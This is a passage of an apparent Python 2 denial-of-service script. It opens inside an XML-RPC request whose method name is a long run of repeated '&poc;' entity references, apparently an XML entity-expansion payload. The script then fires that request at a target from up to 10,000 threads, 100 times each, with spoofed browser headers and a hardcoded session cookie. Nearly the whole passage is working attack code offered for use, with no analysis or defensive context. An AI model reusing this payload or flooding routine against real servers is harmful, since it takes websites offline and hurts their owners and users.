;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;</methodName>
  <params>
   <param><value>aa</value></param>
   <param><value>aa</value></param>
  </params>
</methodCall>"""
req = urllib2.Request(target,data)
req.add_header('Accept', '*/*')
req.add_header('User-Agent', 'Mozilla/5.0 (Wihndows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0')
req.add_header('Cookie', 'PHPSESSID=9fkioe7aso0qb7ojt9nc884c53; _gat=1; _ga=GA1.2.1621297442.1563395634; _gid=GA1.2.751627580.1566172493')
req.add_header('Connection', '')
req.add_header('Content-type', 'text/xml')

class MyThread(threading.Thread):
    def run(self): 
		print("{} started!".format(self.getName()))
		for x in range(100):
			res = urllib2.urlopen(req)
		#rdata = res.read()
		time.sleep(.2)                                      # Pretend to work for a second
		print("{} finished!".format(self.getName()))             # "Thread-x finished!"

if __name__ == '__main__':
    for x in range(10000):                                     # five times...
        mythread = MyThread(name = "Thread-{}".format(x + 1))  # ...Instantiate a thread and pass a unique ID to it
        mythread.start()                                   # ...Start the thread
        time.sleep(.1)                                     # ...Wait 0.9 seconds before starting another
